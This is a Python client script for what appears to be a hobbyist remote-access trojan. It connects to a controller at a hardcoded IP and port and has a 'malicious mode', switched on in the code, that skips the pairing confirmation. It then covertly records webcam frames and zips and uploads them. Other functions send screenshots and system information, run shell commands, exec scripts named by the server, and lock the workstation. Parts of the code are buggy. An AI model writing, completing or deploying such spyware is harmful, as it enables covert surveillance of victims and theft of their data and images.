import os
import platform
import socket
import subprocess
import sys
import time
from pprint import pprint
from zipfile import ZipFile

import cv2
from mss import mss


class Client:
    def __init__(self, server_ip, port, buffer_size, client_ip):
        self.SERVER_IP = server_ip
        self.PORT = port
        self.BUFFER_SIZE = buffer_size
        self.CLIENT_IP = client_ip
        self.recvcounter = 0
        self.sscount = 0
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connectToServer(self):
        self.client.connect((self.SERVER_IP, self.PORT))

    def confirmconnection(self):
        gendkey = self.client.recv(self.BUFFER_SIZE).decode()
        print(gendkey)
        acceptancecode = input("Enter the Given Key: ")

        if acceptancecode != gendkey:
            # todo
            print("Pairing Failed")
            self.client.send("MISMATCH".encode("utf-8"))
            self.client.close()

        else:
            print("KEYS MATCHED - PAIRING SUCCESSFUL")
            self.client.send("MATCH".encode("utf-8"))

    def progress(self):
        malorgood = "1"  #input("Enter 1 to run in malicious mode or 2 to run in virtuous mode: ")
        if malorgood == "1":
            print("Malicious mode enabled: ")
            self.client.send("1".encode("utf-8"))
        else:
            print("Virtuous mode enabled: ")
            self.client.send("2".encode("utf-8"))
            self.confirmconnection()
        while True:
            input("Success - Reached the code loop")
            #self.sendHostInfo()
            self.capture()
            input("Done")

    def runrun(self, msg):
        obj = "failed"
        try:
            obj, _ = subprocess.run(msg, check=True, shell=True)
            # output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
        except Exception as e:
            print("This failed too (runrun) : " + str(e) + " + " + str(obj))

    def sendHostInfo(self):
        """ Extracting host information """

        host = sys.platform
        self.client.send(host.encode("utf-8"))
        # Make a Dictionary
        sys_info = {
                    "Platform": platform.system(),
                    "Platform Release": platform.release(),
                    "Platform Version": platform.version(),
                    "Platform Architecture": platform.architecture(),
                    "Machine Type": platform.machine(),
                    "Platform Node": platform.node(),
                    "Platform Information": platform.platform(),
                    "ALL": platform.uname(),
                    "HostName": socket.gethostname(),
                    "Host IP_Address": socket.gethostbyname(socket.gethostname()),
                    "CPU": platform.processor(),
                    "Python Build": platform.python_build(),
                    "Python Compiler": platform.python_compiler(),
                    "Python Version": platform.python_version(),
                    "Windows Platform": platform.win32_ver()
                  #  "OS": os.uname() # os.uname() ONLY SUPPORTED ON LINUX
                   }
        # https://www.geeksforgeeks.org/platform-module-in-python/#:~:text=Python%20defines%20an%20in%2Dbuilt,program%20is%20being%20currently%20executed.
        cpu = platform.processor()
        system = platform.system()
        machine = platform.machine()

        with open('./logs/info.txt', 'w+') as f:
            for k, v in sys_info.items():
                f.write(str(k) + ' >>> ' + str(v) + '\n\n')

        with open('./logs/info.txt', 'rb+') as f:
            self.client.send(f.read())
        print("CPU: " + cpu + '\n', "System: " + system + '\n', "Machine: " + machine + '\n')
        input()
        pprint(sys_info)
        input()
        self.sysinfViaCMDFile()

    def sysinfViaCMDFile(self):
        # traverse the info
        Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
        new = []

        # arrange the string into clear info
        for item in Id:
            new.append(str(item.split("\r")[:-1]))
        with open("./logs/moreinfoC.txt", "w+") as f:
            for i in new:
                print(i[2:-2])
                f.write(i[2:-2] + "\n")
        with open('./logs/moreinfoC.txt', 'rb+') as f:
            #self.client.send(os.path.getsize('./logs/moreinfoC.txt').encode())
            c = f.read()
            print(len(c))
            time.sleep(1)
            self.client.send((str(len(c))).encode())
            time.sleep(10)
            self.client.send(c)

    def sysinfViaCMD(self):
        # traverse the info
        Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
        new = []

        # arrange the string into clear info
        for item in Id:
            new.append(str(item.split("\r")[:-1]))
        for i in new:
            print(i[2:-2])

    def exePy(self):
        path2script = self.client.recv(self.BUFFER_SIZE).decode()

        try:
            exec(open(path2script).read())
            self.client.send("SUCCESS".encode())
        except:
            self.client.send("FAILURE".encode())


    def ssht(self):
        ss = mss()
        ss.shot(output='./logs/screen{}.png'.format(self.sscount))  # taking screenshot
        picsize = os.path.getsize('./logs/screen{}.png'.format(self.sscount))
        self.client.send(str(picsize).encode())
        time.sleep(0.1)
        with open('./logs/screen{}.png'.format(self.sscount), 'rb') as screen:
            tosend = screen.read()
            self.client.send(tosend)  # sending actual file
        # os.remove('./logs/screen{}.png'.format(self.screenshot_counter))  # removing file from host
        self.sscount += 1
        print("SUCCESS")

    def locksystem(self):
        ## command = "-locksystem"
        ## self.client.send(command.encode("utf-8"))
        try:
            msg = "rundll32.exe user32.dll, LockWorkStation"
            self.runrun(msg)
            self.client.send("[+] PC Locked".encode("utf-8"))
        except:
            self.client.send("[!] LOCKING FAILED".encode("utf-8"))

    def capture(self):
        counter = 0
        vc = cv2.VideoCapture(0)
        if vc.isOpened():  # try to get the first frame
            rval, frame = vc.read()
            cv2.imwrite('./logs/Video/video{}.png'.format(counter), frame)
            counter += 1
        else:
            rval = False
        fr = 200
        while fr > 0:  # rval:
            fr -= 1
            if len(str(counter)) < 4:
                spacer = "0" * (4 - int((len(str(counter)))))
            cv2.imwrite('./logs/Video/vid{}{}.png'.format(spacer, counter), frame)
            counter += 1
            print(str(counter))
            rval, frame = vc.read()
            cv2.waitKey(int(1000 / 24))
        vc.release()
        print("Sending: ")
        #time.sleep(10)
        self.webcamsend()

    def webcamsend(self):
        print("sendloop")

        #self.client.send("Success".encode())
        print("sendsuccess")


        # create a zip archive
        archname = f'./logs/webcam{str(self.recvcounter)}.zip'
        archive = ZipFile(archname, 'w')
        print("zipcreated + " + archname)

        filePath = './logs/Video'
        with os.scandir(filePath) as entries:
            print(str(len(entries)))
            for entry in entries:
                print(entry.name)
                p = str(filePath) + str("/") + str(entry.name)
                archive.write(p)
        archive.close()
        print("test")

        # send size
        archivesize = os.path.getsize(archname)

        #self.client.send(str(archivesize).encode("utf-8"))
        time.sleep(0.5)

        # send archive
        with open(archname, 'rb') as to_send:
            self.client.send(to_send.read())
            print("Should have worked.")
        # os.remove(archname)


def main():
    SERVER_IP = "192.168.56.1"  # modify me
    PORT = 1337  # modify me (if you want)
    BUFFER_SIZE = 2048
    safemode = bool(True)

    try:
        os.mkdir('./logs')
    except FileExistsError:
        pass

    CLIENT = socket.gethostname()
    CLIENT_IP = socket.gethostbyname(CLIENT)
    print(CLIENT_IP)
    while True:
        try:
            client = Client(SERVER_IP, PORT, BUFFER_SIZE, CLIENT_IP)
            client.connectToServer()

            client.progress()
        except:
            pass

if __name__ == "__main__":
    main()
